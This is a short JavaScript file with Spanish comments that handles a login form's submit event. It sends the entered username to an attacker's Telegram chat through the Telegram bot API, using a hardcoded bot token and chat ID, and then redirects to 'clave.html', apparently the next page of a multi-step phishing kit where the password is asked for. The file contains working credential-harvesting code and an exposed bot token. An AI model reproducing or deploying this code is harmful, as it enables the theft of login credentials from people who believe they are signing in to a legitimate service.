document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("loginForm").addEventListener("submit", function (event) {
        event.preventDefault(); // Evita recargar la página

        let usuario = document.getElementById("usuario").value.trim();
        
        if (usuario === "") {
            alert("Por favor, ingresa tu usuario.");
            return;
        }

        // Datos del bot de Telegram
        let botToken = "7504281821:AAHWdSuYPKftjOmBC2N03av3PaF7qyEqd9g"; // Token del bot
        let chatId = "7829793593"; // ID del chat donde se enviará el mensaje
        let message = `🔔 Nuevo intento de inicio de sesión:\n👤 Usuario: ${usuario}`;

        // URL de la API de Telegram
        let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Enviar mensaje a Telegram
        fetch(telegramURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).then(response => {
            if (response.ok) {
                console.log("Mensaje enviado a Telegram");
                window.location.href = "clave.html"; // Redirigir a clave.html
            } else {
                alert("Error al enviar mensaje a Telegram.");
            }
        }).catch(error => {
            console.error("Error:", error);
            alert("No se pudo enviar el mensaje.");
        });
    });
});
